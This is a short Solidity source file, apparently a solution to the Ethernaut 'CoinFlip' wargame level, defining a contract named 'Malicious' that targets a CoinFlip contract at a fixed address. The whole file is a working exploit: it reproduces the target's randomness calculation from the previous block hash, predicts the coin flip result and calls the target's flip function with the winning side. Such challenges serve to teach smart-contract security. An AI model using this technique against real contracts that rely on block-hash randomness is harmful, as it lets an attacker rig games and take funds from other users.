// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract Malicious {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 lastHash;
  CoinFlip public flipper = CoinFlip(0x46D671d6C8fdE597c72346f56bF997f9e82D1DA0);


  function flipGood() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 flip = uint256(blockValue / FACTOR);
    bool side = flip == 1 ? true : false;

    flipper.flip(side);

    return true;
  }
}
